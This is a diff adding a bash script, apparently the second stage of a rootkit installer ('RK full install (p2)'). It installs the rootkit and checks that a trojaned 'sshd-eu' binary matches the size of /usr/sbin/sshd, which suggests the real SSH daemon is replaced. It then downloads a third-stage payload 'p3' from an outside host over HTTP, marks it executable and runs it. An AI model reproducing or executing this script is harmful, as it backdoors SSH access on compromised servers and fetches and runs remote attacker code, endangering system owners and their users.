@@ -1,0 +1,28 @@
+#!/bin/bash
+############## RK full install (p2)
+
+# echo -e "\033[0;31m [-] \033[0m\033[0m" # red
+# echo -e "\033[0;32m [+] \033[0m\033[0m" # green
+# echo -e "\033[0;36m xxx \033[0m\033[0m" #cyan
+echo
+
+os=`cat 1tempfiles/os.txt`
+rk=`cat 1tempfiles/rk.txt`
+side_files_dir=`cat 1tempfiles/side_files_dir.txt`
+maindir=`pwd`
+
+echo -e "\033[0;32m [+] \033[0m\033[0m starting full rk install" # green
+rkdir="$maindir/$rk"
+cd $rkdir ; ./run install $rk 1>>$maindir/1tempfiles/log.rkinstall 2>>$maindir/1tempfiles/log.rkinstall
+size_rk=`wc -c < $rk/sshd-eu`
+size_sshd=`wc -c < /usr/sbin/sshd`
+if [ "$size_rk" != "$size_sshd" ] ; then  echo -e "\033[0;31m [-] \033[0m\033[0m something is wrong. aborting. check ($maindir/1tempfiles/log.rkinstall)" ; echo ; exit ; fi
+echo -e "\033[0;32m [+] \033[0m\033[0m rk install done (logs in $maindir/1tempfiles/log.rkinstall)"
+
+cd $maindir
+echo -e "\033[0;32m [+] \033[0m\033[0m downloading rkip install file (p3)" # green
+rm -rf p3
+curl --progress-bar -O http://gopremium.mooo.com/.../auto/p3
+if [ ! -f p3 ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+chmod +x p3 ; ./p3
+
